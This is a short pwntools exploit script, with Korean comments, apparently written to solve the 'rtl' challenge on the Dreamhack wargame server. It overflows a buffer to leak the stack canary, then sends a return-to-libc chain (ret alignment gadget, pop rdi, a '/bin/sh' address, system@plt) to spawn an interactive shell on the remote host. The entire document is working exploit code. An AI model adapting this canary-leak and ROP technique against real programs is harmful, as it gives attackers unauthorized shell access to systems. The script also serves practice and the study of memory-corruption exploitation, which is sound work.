#내 프로그램 
from pwn import *

#p = process("./rtl")
p = remote('host2.dreamhack.games', 8304)
e = ELF("./rtl")

buf = b"a" * 0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = b"\x00"+p.recvn(7)
print("canary= "+str(canary))

system_plt = e.plt["system"]
print("system_plt: "+str(system_plt))
#binsh = 0x402004
#pop_rdi = 0x0000000000401333
#ret = 0x000000000040101a    #ret가젯을 넣는 것이다.
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b"a"*0x38 + canary + b"b"*0x8
payload += p64(ret) # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

pause()
p.sendafter("Buf: ", payload)

p.interactive()